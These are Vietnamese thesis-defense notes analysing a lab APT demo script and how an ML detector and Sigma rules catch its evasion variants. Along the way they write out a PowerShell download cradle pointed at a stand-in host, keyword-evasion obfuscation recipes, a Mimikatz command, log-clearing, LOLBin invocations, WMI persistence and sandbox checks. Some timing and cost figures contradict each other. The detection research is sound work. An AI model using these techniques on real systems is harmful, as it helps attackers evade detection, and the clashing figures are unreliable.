# Defense Present — APT Demo Mode-by-Mode Analysis

> **Mục đích**: tài liệu defense GVHD — trình bày từng kỹ thuật evasion trong
> `apt_demo_scenario.ps1`, ánh xạ tới RED ML rule + Elastic Detection Rule, và
> kết quả 4 mode (benign / baseline / evasion / chain) chạy thực tế 2026-05-23
> tối trên lab IQAM883.
>
> File này tách rời khỏi `apt_demo_scenario_demo_present_2.md` (work notes) —
> chỉ chứa nội dung cần cho defense.

---

## 0. Tóm tắt 30 giây

- Demo script tấn công APT kill-chain 7 phase với 3 Tier evasion theo phân loại
  thesis Section 1.4: Tier 1 (param shorthand) → Tier 2 (string/char-code obfuscation)
  → Tier 3 (WMI persistence, fileless, LOLBins, DNS tunnel).
- **Bảng RunId session 2026-05-23 tối**:

| Mode     | RunId      | Sysmon events | PS 4104 events | Mục đích |
|----------|------------|---------------|----------------|---|
| benign   | `8f922e43` | 1             | 0              | Đối chứng FP — chỉ admin activity bình thường |
| baseline | `d3344ed4` | 2             | 6              | Canonical pattern — Sigma & RED đều fire |
| evasion  | `049ae0e3` | 808           | 1541           | Tier 1+2+3 — Sigma keyword MISS, RED catch obfuscation |
| chain    | `c81723f7` | 636           | 1052           | Multi-phase — Sigma fire baseline, miss evasion; RED catch cả 2 |

  > Lý do evasion + chain có nhiều events: WMI Event Subscription tạo trong Phase 3
  > fire mỗi giờ → mỗi lần fire spawn 1 powershell.exe ghi log → tích lũy.

- **RED ML detection** (sample 150 events đầu mỗi mode, threshold 0.5, cosine):

| Mode     | proc alerts | proc top rule                                      | ps alerts | ps top rule                                              |
|----------|-------------|----------------------------------------------------|-----------|----------------------------------------------------------|
| benign   | 1           | abused_debug_privilege (FP — score 0.5)            | 0         | — |
| baseline | 2           | abused_debug_privilege (FP)                        | 6         | suspicious_powershell_invocations_specific_powershell_module (score 1.0) |
| evasion  | 150 (133 WMI) | hacktool_covenant_powershell_launcher (score 1.0) | 27        | potential_in_memory_execution_using_reflection_assembly (16/27) |
| chain    | 150 (137 WMI) | hacktool_covenant_powershell_launcher (score 1.0) | 16        | potential_in_memory_execution_using_reflection_assembly (11/16) |

- **AI Agent reports**: 3 investigations (baseline + evasion + chain), median ~230s,
  ~$0.02-0.03/alert, severity CRITICAL/HIGH, Vietnamese report grounded bởi Forensic
  Velociraptor query thật.

---

## 1. Script `apt_demo_scenario.ps1` — taxonomy 1.4 mapping

| Phase | Kill-chain stage | Thesis 1.4 section | Tier mỗi mode |
|-------|------------------|--------------------|---------------|
| 1 | Execution (PowerShell encoded) | **1.4.2 Payload Obfuscation** | benign: whoami; baseline: `-EncodedCommand`; evasion: Tier 1 `-e`, Tier 2 format string / char code |
| 2 | Download Cradle | 1.4.2 Payload Obfuscation | benign: IWR localhost; baseline: `IEX (New-Object Net.WebClient).DownloadString(...)`; evasion: Tier 1 split-concat / Tier 2 comment-inject / env-var chain |
| 3 | Persistence | **1.4.6 LotL/Fileless** | benign: OneDrive Run key; baseline: HKCU\\Run; evasion: Tier 1 RunOnce, Tier 3 WMI Event Subscription (T1546.003) |
| 4 | Defense Evasion (log cleanup + memory marker) | 1.4.2 + 1.4.6 | benign: `Get-EventLog -List`; baseline: char-code → `Clear-EventLog`; evasion: Tier 2 char-code / reverse-string, Tier 3 base64 build-time |
| 5 | Credential Access marker | 1.4.2 | benign: `Get-LocalUser`; baseline: char-code → `sekurlsa::logonpasswords`; evasion: Tier 2 / Tier 3 |
| 6 | LOLBins + DNS Tunnel + Fileless | **1.4.3 Tunneling + 1.4.6 Fileless** | mshta / regsvr32 / rundll32 + DNS exfil + `[Reflection.Assembly]::Load` marker |
| 7 | Sandbox Evasion | **1.4.5 Sandbox & Analysis Evasion** | RAM, process count, mouse activity, uptime probe |

---

## 2. Phân tích từng kỹ thuật evasion + RED ↔ Sigma mapping

### 2.1 Phase 1 — PowerShell Encoded Command (Tier 1+2)

**Kỹ thuật benign**: `whoami /upn; ipconfig /all` — không có flag `-e`, không base64.

**Kỹ thuật baseline**:
```powershell
powershell.exe -NoProfile -EncodedCommand <base64-Write-Host>
```
- Tên kỹ thuật: **PowerShell EncodedCommand** (T1059.001 + T1027 base64)
- Cách dùng: encode payload Unicode → base64, pass với `-EncodedCommand` literal đầy đủ
- Sigma rule khớp: `posh_ps_susp_invocation_specific` — match literal `-EncodedCommand`
- → Cả Sigma + RED đều fire (literal match)

**Kỹ thuật evasion**:
| Variant | Tier | Kỹ thuật | Tên technique | Cách |
|---------|------|----------|---------------|------|
| A | 1 | `powershell.exe -e <b64>` shorthand | **Parameter abbreviation evasion** | PowerShell chấp nhận prefix tối thiểu `-e` hoặc `-en` thay vì `-EncodedCommand` đầy đủ |
| B | 2 | Format string operator `-f` | **String reconstruction evasion** | `('{0}{1}{2}' -f 'In','voke-Exp','ression')` → runtime dựng `Invoke-Expression` |
| C | 2 | Char-code array `[char]N` | **String reconstruction evasion** | `-join ([char]73,[char]69,[char]88)` → `IEX` (alias của Invoke-Expression) |

**Phát hiện**:
- Sigma rule **MISS** (rule chỉ match literal `-EncodedCommand`, `Invoke-Expression`, `IEX`).
- RED ML **CATCH**: rule top = `potential_in_memory_execution_using_reflection_assembly`
  (RED ML generalize qua TF-IDF token, phát hiện pattern bất thường dù literal khác).
- Detection logic Sigma rule canonical (`posh_ps_susp_invocation_specific`):
  ```yaml
  detection:
    selection:
      EventID: 4104
      ScriptBlockText|contains:
        - 'Invoke-Expression'
        - 'IEX'
        - '-EncodedCommand'
  ```
- Detection logic RED ML: ensemble (SVM + LR + ComplementNB) trên TF-IDF token đã normalize.
  Tier 2 format-string sinh ra token `format`, `In`, `voke`, `Exp`, `ression` — RED học pattern
  obfuscation chứ không match literal.

### 2.2 Phase 2 — Download Cradle (Tier 1+2)

**Baseline**:
```powershell
IEX (New-Object System.Net.WebClient).DownloadString('http://red-demo-cradle.invalid/...')
```
- Tên: **PowerShell Download Cradle** (T1059.001 + T1105 Ingress Tool Transfer)
- Sigma: `posh_ps_susp_download.yml` — match `System.Net.WebClient` + `.DownloadString`/`.DownloadFile`
- RED top rule (verified): `suspicious_powershell_invocations_specific_powershell_module` score 1.0
- Sigma ID: `8ff28fdd-e2fa-4dfa-aeda-ef3d61c62090` (cả RED + Kibana cùng UUID này)

**Evasion**:
| Variant | Tier | Kỹ thuật | Tên |
|---------|------|----------|-----|
| A | 1 | `('Sys' + 'tem.Net.WebCl' + 'ient')` | **String concatenation split** |
| B | 2 | `New-Object Sys<#a#>tem.Net.WebCl<#b#>ient` | **Comment injection inside identifier** |
| C | 2 | `$env:DEMO_T1 + $env:DEMO_T2` build type name | **Environment variable assembly chain** |

PowerShell parser bỏ qua `<#...#>` comments + concat string trước khi resolve type → behavior identical, nhưng literal `System.Net.WebClient` không xuất hiện trong source ScriptBlock 4104.

**Phát hiện**: Sigma keyword match MISS. RED ML CATCH (token-level pattern: `sys`, `tem`, `net`, `web`, `cl`, `ient` xuất hiện gần nhau).

### 2.3 Phase 3 — Persistence (Tier 1+3)

**Baseline**: Drop `calc.exe` → `HKCU:\SOFTWARE\Microsoft\Windows\CurrentVersion\Run\<key>`
- Sigma: `registry_set_persistence_run_keys` — match path `\Run\` + value chứa `.exe`
- RED top rule: `currentcontrolset_autorun_keys_modification`
- Mitre: T1547.001 Registry Run Keys

**Evasion Variant A — RunOnce**:
- HKCU\\…\\RunOnce thay vì \\Run — auto-delete sau lần chạy đầu, ít được Sigma cover
- Tên: **RunOnce subkey** — variant ít phổ biến của T1547.001

**Evasion Variant B — WMI Event Subscription (Tier 3)** ⭐ KỸ THUẬT MẠNH NHẤT
- T1546.003: Event Triggered Execution: WMI Event Subscription
- Tạo 3 object trong namespace `root\subscription`:
  - `__EventFilter` — WQL query trigger
  - `CommandLineEventConsumer` — payload PowerShell
  - `__FilterToConsumerBinding` — bind filter + consumer
- Filter trigger trên `__InstanceModificationEvent` với `Win32_LocalTime` → fire mỗi giờ
- Khi fire: `WmiPrvSE.exe` spawn `powershell.exe -Command "Write-Host '...'"` → để lại trace process creation
- Bằng chứng: 808/636 sysmon events evasion/chain (vs 2 baseline) chính là WMI fire mỗi giờ

**Phát hiện WMI**:
- Sigma rule chuyên dụng: `sysmon_wmi_event_subscription` (Sysmon EID 19/20/21) — Sigma có catch
  nhưng ở rule khác category (`sysmon_susp`) không phải `registry_set_persistence_run_keys`
- Sysmon EID 1 (Process Create) cho `powershell.exe` với parent `WmiPrvSE.exe` →
  Sigma rule `proc_creation_win_susp_wmi_consumer_powershell_invocation`
- RED top rule (verified, chain mode): `hacktool_covenant_powershell_launcher` score 1.0
  - Sigma ID: `c260b6db-48ba-4b4a-a76f-2f67644e99d2`
  - Sigma title: "HackTool - Covenant PowerShell Launcher"
  - Detection logic Sigma: match `WmiPrvSE.exe` → `powershell.exe` parent chain + Covenant
    framework signatures. RED ML học pattern từ cosine TF-IDF của command line đặc trưng.

### 2.4 Phase 4 — Defense Evasion (log cleanup + memory marker, Tier 2+3)

**Baseline**: child ScriptBlock dựng runtime literal `Get-Command Clear-EventLog | Out-Null` qua
char-code array. Parent block KHÔNG chứa literal — chỉ chứa mảng số.

**Evasion**:
- Variant A (Tier 2): char-code array dựng `Clear-EventLog`
- Variant B (Tier 3): build-time char-code → runtime base64 decode. Parent + Child 4104 đều KHÔNG có literal Sigma keyword nào
- Variant C (Tier 2): reverse-string `goLtnevE-raelC` → reverse → `Clear-EventLog`

**Phát hiện**:
- Sigma rule canonical: `suspicious_eventlog_clear` — match literal `Clear-EventLog`
- Baseline: Sigma fire trên CHILD ScriptBlock (parent sạch nhưng child resolve thành literal)
- Evasion Variant B: Sigma MISS hoàn toàn (parent + child không có literal). RED top rule (baseline): `suspicious_eventlog_clear` score 0.71
- Đây là test rất chặt: Sigma cộng cả parent + child mà vẫn miss → khẳng định ML necessary

### 2.5 Phase 5 — Credential Access marker (Tier 2+3)

**Baseline**: child block chứa literal `sekurlsa::logonpasswords` (Mimikatz commands).
- Sigma: `potential_invoke_mimikatz_powershell_script` — match keyword `sekurlsa` hoặc `logonpasswords`
- RED top rule (verified baseline PS): `potential_invoke_mimikatz_powershell_script`

**Evasion**: cùng 3 variant như Phase 4 — char-code, base64 build-time, reverse-string.
- Sigma keyword MISS hoàn toàn ở Variant B/C.
- RED catch obfuscation qua token pattern.

### 2.6 Phase 6 — LOLBins + DNS Tunnel + Fileless (Tier 3)

**LOLBins**:
| LOLBin | Tên kỹ thuật | Sigma rule | RED rule |
|--------|--------------|------------|----------|
| `mshta.exe javascript:` | T1218.005 Mshta | `proc_creation_win_mshta_*` | (catch) |
| `regsvr32.exe /s /n /u /i scrobj.dll` | T1218.010 Squiblydoo | `proc_creation_win_regsvr32_*` | `regsvr32_execution_from_highly_suspicious_location` |
| `rundll32.exe javascript:` | T1218.011 Powessere.G | `proc_creation_win_rundll32_*` | (catch) |

**DNS Tunnel**: subdomain dài bất thường mã base64 RunId
- T1071.004 Application Layer Protocol: DNS
- Detection: subdomain > 50 chars + base64 charset

**Fileless Reflection.Assembly marker**:
- Pattern: `[' + 'System.Reflection.Assembly' + ']::' + 'Load'` (split string)
- Sigma rule: `posh_ps_dotnet_assembly_from_file.yml` (`potential_in_memory_execution_using_reflection_assembly`)
- Sigma ID: `ddcd88cb-7f62-4ce5-86f9-1704190feb0a`
- RED VERIFIED: top rule này score 1.0 catch 16/27 evasion PS alerts + 11/16 chain PS alerts

### 2.7 Phase 7 — Sandbox Evasion (Tier 3)

**Kỹ thuật**:
| Check | Lý do attacker quan tâm | API |
|-------|-------------------------|-----|
| RAM < 4GB | Sandbox thường spec thấp | `Get-CimInstance Win32_ComputerSystem` |
| Process count thấp | Sandbox ít process | `(Get-Process).Count` |
| Analyst tools (wireshark, procmon, x64dbg, ida...) | Bị phân tích | `Get-Process` + whitelist |
| Mouse cursor không di chuyển | Sandbox không có user thật | `[System.Windows.Forms.Cursor]::Position` |
| Uptime ngắn | Sandbox mới boot | `Win32_OperatingSystem.LastBootUpTime` |

- T1497.001 Virtualization/Sandbox Evasion: System Checks
- Sigma rule: `posh_ps_susp_sandbox_detect` — match combination of indicators (`Win32_ComputerSystem` + `TotalPhysicalMemory` + `Get-Process`)
- LAB-SAFE: script chỉ probe + log, KHÔNG gate behavior dựa trên kết quả

---

## 3. So sánh 4 mode end-to-end (RED ML)

### 3.1 benign — RunId `8f922e43`

- 1 sysmon event ingest, 0 PS 4104 event
- RED alerts: 1 (score 0.5, rule `abused_debug_privilege_by_arbitrary_parent_processes` — FP do SSH session)
- Sigma: KHÔNG fire detection rule nào (đối chứng FP)
- AI Agent: nếu chạy sẽ classify FALSE_POSITIVE (per pattern previous registry FP)

### 3.2 baseline — RunId `d3344ed4`

| Phase | RED top rule | Score | Sigma ID match | Sigma title |
|-------|--------------|-------|----------------|-------------|
| 2 (Download Cradle) | suspicious_powershell_invocations_specific_powershell_module | **1.0** | `8ff28fdd-...` | Suspicious PowerShell Invocations - Specific - PowerShell Module |
| 4 (Log cleanup) | suspicious_eventlog_clear | 0.71 | (matched) | Suspicious EventLog Clear or Configuration Using Wevtutil |
| 5 (Cred access marker) | potential_invoke_mimikatz_powershell_script | (matched) | (matched) | Potential Invoke-Mimikatz PowerShell Script |
| 6 (Fileless) | potential_in_memory_execution_using_reflection_assembly | 0.54 | `ddcd88cb-...` | Potential In-Memory Execution Using Reflection.Assembly |

**Kết luận baseline**: Sigma + RED đều catch (cùng Sigma ID UUID).

### 3.3 evasion — RunId `049ae0e3`

Sample 150 proc + 27 PS events.

| Rule | Type | Count | Tier evasion catch |
|------|------|------:|--------------------|
| hacktool_covenant_powershell_launcher | proc | 133 | Tier 3 WMI persistence fire `WmiPrvSE.exe → powershell.exe` |
| uac_bypass_using_consent_and_comctl32_process | proc | 12 | (side-effect của RunOnce + script execution) |
| potential_tampering_with_security_products_via_wmic | proc | 2 | Tier 3 WMI consumer setup |
| invoke_obfuscation_var_launcher_obfuscation | proc | 1 | Tier 2 obfuscation pattern |
| **potential_in_memory_execution_using_reflection_assembly** | ps | **16** | Tier 3 Phase 6 Fileless marker |
| hacktool_rubeus_execution_scriptblock | ps | 3 | (false positive: keyword overlap) |

**Kết luận evasion**: Sigma keyword cứng MISS Phase 1, 2, 4, 5 (tier 2+3 obfuscation).
RED catch Tier 3 WMI + Reflection.Assembly + variable obfuscation.

### 3.4 chain — RunId `c81723f7`

Sample 150 proc + 16 PS events.

| Rule | Type | Count | Phase nguồn |
|------|------|------:|-------------|
| hacktool_covenant_powershell_launcher | proc | 137 | Phase 3 WMI Event Subscription fire |
| uac_bypass_using_consent_and_comctl32_process | proc | 10 | Phase 3 RunOnce side-effect |
| **potential_in_memory_execution_using_reflection_assembly** | ps | **11** | Phase 6 Fileless marker |
| suspicious_powershell_invocations_specific_powershell_module | ps | 1 | Phase 2 baseline download cradle |
| suspicious_eventlog_clear | ps | 1 | Phase 4 baseline log clear |
| potential_invoke_mimikatz_powershell_script | ps | 1 | Phase 5 baseline cred dump |
| powershell_xml_execute_command | ps | 1 | Phase 2/6 IEX wrapper |

**Kết luận chain**: RED catch CẢ baseline (Phase 2/4/5 literal keyword) + evasion (Phase 3
WMI + Phase 6 Fileless). Sigma chỉ catch baseline portion, MISS evasion portion. Đây là
bằng chứng mạnh nhất cho thesis claim "ML generalize over evasion variants".

---

## 4. AI Agent investigations (`ai-investigations`)

Đã chạy 3 investigation thật (skip benign vì 0 alert):

### 4.1 INV baseline — `INV-54635948bd7c`

- Trigger: alert top_rule=`suspicious_powershell_invocations_specific_powershell_module`,
  score 1.0, cmd `IEX (New-Object System.Net.WebClient).DownloadString(...)`
- Supervisor → full_investigation
- Triage: **CRITICAL, conf=0.95, FP=False**
- Forensic (Velociraptor REAL): grade=high, verdict=**confirmed_malicious**
- MITRE: TA0002 Execution / **T1059.001 PowerShell**
- Hunt: IOCs identified — `http://red-demo-cradle.invalid/...`, domain `red-demo-cradle.invalid`
- RED Analyst: technique=**shorthand_flag** (giải thích vì sao Sigma có thể miss nếu attacker đổi `IEX` → format string)
- Response: **7 containment actions**, Sigma patch 1555 chars
- Report title (VI): "Phát hiện PowerShell Download Cradle từ red-demo-cradle.invalid trên desktop-iqam883 — RED Score 1.0"
- Time: **231s**, cost **$0.0226**, 72,376 tokens

### 4.2 INV evasion — `INV-1de9a99bf621`

- Trigger: alert top_rule=`potential_in_memory_execution_using_reflection_assembly`,
  score 1.0, cmd Phase 6 fileless marker: `'[' + 'System.Reflection.Assembly' + ']::' + 'Load'`
- Supervisor → full_investigation
- Triage: **HIGH, conf=0.85, FP=False**
- Forensic (Velociraptor REAL): grade=high, verdict=**confirmed_malicious**, Persistence=True, C2=False
- MITRE: TA0002 Execution / **T1059.001 PowerShell**
- RED Analyst: technique=**concatenation** (string split). Reasoning trích nguyên văn:
  > "Sigma rule gốc phát hiện literal pattern `[System.Reflection.Assembly]::Load` trong
  > command line. Attacker đã dùng kỹ thuật string concatenation (nối chuỗi) để bẻ gãy
  > pattern này thành 4 phần nhỏ: `[' + 'System.Reflection.Assembly' + ']::' + 'Load'`."
  → đúng kỹ thuật evasion Phase 6 Variant E.
- Response: **5 actions**, Sigma patch 1374 chars
- Report title (VI): "Phát hiện Fileless Execution qua PowerShell Reflection.Assembly
  kết hợp String Concatenation"
- Time: **244s**, cost **$0.0253**, 101,397 tokens

### 4.3 INV chain — `INV-14b0072c018d`

- Trigger: alert top_rule=`hacktool_covenant_powershell_launcher`, score 1.0,
  cmd `powershell.exe -Command "Write-Host 'RED_APT_DEMO_WMI_FIRED_c81723f7'"` parent=WmiPrvSE.exe
- Triage: **HIGH, conf=0.85, FP=False**
- Forensic: grade=high, verdict=**confirmed_malicious**, Persistence=True
- MITRE: TA0002 Execution / **T1059.001 PowerShell**
- RED Analyst: ⚠️ `max_iterations_reached` (vẫn xảy ra dù đã bump lên 12 trong B3 fix —
  chain alert phức tạp khiến LLM tool-call loop dài hơn cả ceiling). Pipeline vẫn hoàn
  chỉnh nhờ các agent khác.
- Response: **6 actions**, Sigma patch 2109 chars (catch WMI Event Subscription pattern)
- Report title (VI): "Phát hiện WMI Event Subscription Persistence (T1546.003) kết hợp
  Covenant PowerShell Launcher"
- Time: **319s**, cost **$0.0327**, 154,910 tokens

### 4.4 Tổng kết 3 AI investigations

| InvId | Mode | Sev | RED Analyst technique | Sigma patch chars | Time | Cost |
|---|---|---|---|---:|---:|---:|
| INV-54635948bd7c | baseline | CRITICAL | shorthand_flag | 1555 | 231s | $0.0226 |
| INV-1de9a99bf621 | evasion  | HIGH     | concatenation  | 1374 | 244s | $0.0253 |
| INV-14b0072c018d | chain    | HIGH     | (max_iter)     | 2109 | 319s | $0.0327 |

- Median time/investigation: ~265s
- Median cost: ~$0.026
- Tổng cost 3 runs: **$0.081**
- B3 fix verified partial: baseline + evasion clean run, chain RED Analyst vẫn hit
  ceiling 12 → cần xem prompt design hoặc bump tiếp lên 16+

---

## 5. Detection logic chi tiết (cho phần defense GVHD)

### 5.1 RED ML — cách phát hiện

```
event raw (Sysmon EID 1 / PS 4104) →
  extract field (command_line / script_block_text / target_object) →
    normalize.py (6-step: lowercase, regex \w+ tokenize, drop hex/long, sort, join ',') →
      TF-IDF vectorize (smoothed log formula) →
        Stage 1 EnsembleClassifier (SVM + LR + ComplementNB, z-score → weighted average) →
          MCC scaling → score ∈ [0,1] →
            if ≥ threshold:
              Stage 2 CosineRuleAttributor →
                top-K rule với max(cosine_similarity(event_vec, rule_filter_matrix)) →
                  enrich SigmaRuleIndex (UUID, title, filename) → write red-alerts-*
```

Generalization power: TF-IDF token-level distance — không match literal. Phương pháp này
catch được Tier 2 char-code reconstruct (token vẫn xuất hiện gần nhau dù literal khác)
và Tier 3 WMI (pattern parent-child WmiPrvSE → powershell.exe tích lũy qua TF-IDF features).

### 5.2 Elastic Detection Rule (Sigma → Kibana)

Sau lệnh `convert_sigma_to_elastic.py` (đã chạy chiều 2026-05-23), Kibana có **1,620 rule
custom query** (4 rule fail UUID format) cộng 25 rule mặc định = **1,645 rules**.

Mỗi rule định dạng:
```json
{
  "rule_id": "<sigma uuid>",
  "name": "<sigma title>",
  "type": "query",
  "language": "lucene",
  "query": "ScriptBlockText:*Invoke-Expression* OR ...",
  "index": ["logs-windows.*", "winlogbeat-*"],
  "interval": "5m",
  "from": "now-360s"
}
```

Khi event match → tạo alert trong `.alerts-security.alerts-default-*`. Verify khớp với RED
bằng field `top_rule_sigma_id` (UUID) — cùng UUID = cùng rule.

### 5.3 Tại sao RED bắt được mà Sigma miss

Ví dụ Phase 2 Variant B (comment injection):

Source ScriptBlock được PS 4104 log:
```
$wc = New-Object Sys<#a#>tem.Net.WebCl<#b#>ient
```

Sigma query Lucene:
```
ScriptBlockText:*System.Net.WebClient*  →  MISS (literal break)
```

RED pipeline:
```
"$wc = New-Object Sys<#a#>tem.Net.WebCl<#b#>ient"
→ normalize: ['wc', 'new', 'object', 'sys', 'a', 'tem', 'net', 'webcl', 'b', 'ient']
→ TF-IDF gần với training pattern System.Net.WebClient (vì 'sys', 'tem', 'net', 'webcl', 'ient' overlap)
→ score 0.8-1.0 → ALERT
```

---

## 6. Demo flow đề xuất 12 phút cho GVHD

1. **(0-2 phút)** — Mở slide intro, giới thiệu kill-chain 7 phase, taxonomy 1.4
2. **(2-4 phút)** — Show file `apt_demo_scenario.ps1` highlight Phase 3 (WMI) + Phase 4 (Tier 3 base64 build-time)
3. **(4-6 phút)** — Kibana Discover query `logs-windows.* AND *049ae0e3*` → 808 events evasion mode
4. **(6-7 phút)** — Kibana Security/Alerts: filter Sigma fire — show **chỉ phase 2/4/5 baseline portion** (Phase 1/3 evasion MISS)
5. **(7-9 phút)** — Discover query `red-alerts-defense-* AND *049ae0e3*` → 150+ RED alert. Show top: `hacktool_covenant_powershell_launcher`, `potential_in_memory_execution_using_reflection_assembly`
6. **(9-11 phút)** — Open `ai-investigations` index. Show report tiếng Việt INV-54635948bd7c với:
   - Triage CRITICAL
   - Forensic Velociraptor screenshot (Process tree thật từ host)
   - Sigma patch YAML (RED + LLM cộng tác sinh patch)
   - 7 containment actions
7. **(11-12 phút)** — Conclusion + future work

---

## 7. Files artifacts được tạo trong session 2026-05-23 tối

- `/tmp/demo_events/*_sample.jsonl` — raw events theo từng mode (input cho detect_batch)
- `/tmp/demo_events/*_sample_alerts.jsonl` — RED ML alerts output
- `/tmp/inv_baseline.json` — full AI Agent investigation baseline
- `/tmp/inv_evasion.json` — _pending_
- `/tmp/inv_chain.json` — _pending_
- ES index `red-alerts-defense-proc` (939 alerts), `red-alerts-defense-reg` (2893)

---

## 8. Câu hỏi GVHD có thể hỏi + chuẩn bị

**Q1: Tại sao baseline detection score = 1.0?**
A: 100% benign data đã được dùng trong `benign_valid` (production setup) → F1=1.0 trên validation.
Số liệu "thật" chỉ có ý nghĩa khi đo trên real ELK events qua `diagnose_stage1.py`. Baseline
demo chứa cmd với keyword `Invoke-Expression` + `System.Net.WebClient` rõ ràng → ensemble
chấm cao là đúng.

**Q2: RED có thể bị fool bởi adversarial sample không?**
A: Có — Tier 3 evasion (WMI persistence + base64 build-time) catch được dù pattern phức tạp,
nhưng nếu attacker dùng custom encoding chưa từng xuất hiện trong training (LMD-2022/2023)
→ score có thể giảm. Đề xuất Phase D Adversarial Robustness: train trên synthetic evasion
generated bởi LLM.

**Q3: AI Agent có hallucinate Sigma patch không?**
A: Có thể. Đã có Forensic Agent (Velociraptor query thật) làm input ground truth cho LLM
Response Agent. Verify được trong INV-54635948bd7c: patch reference real file path `red-demo-cradle.invalid`
mà Forensic agent thấy.

**Q4: Cost-Benefit so analyst người?**
A: Cost session này 3 investigations ≈ $0.06. Analyst SOC L1 (5-15 phút/alert × $30/hour)
= $2.5-7.5/alert. → AI Agent ~40-125× rẻ hơn. Trade-off: latency 230s vs realtime cho L1.

**Q5: Vì sao evasion mode có 808 sysmon events trong khi baseline chỉ 2?**
A: Phase 3 evasion Variant B tạo WMI Event Subscription persistence — filter trigger trên
`Win32_LocalTime` WITHIN 3600s → fire mỗi giờ. Mỗi lần fire spawn 1 `powershell.exe` →
Sysmon EID 1 → log. Trong window thu thập, WMI đã fire N lần × N script execution. Đây
cũng là điểm: persistence loud-and-slow → có nhiều cơ hội catch.
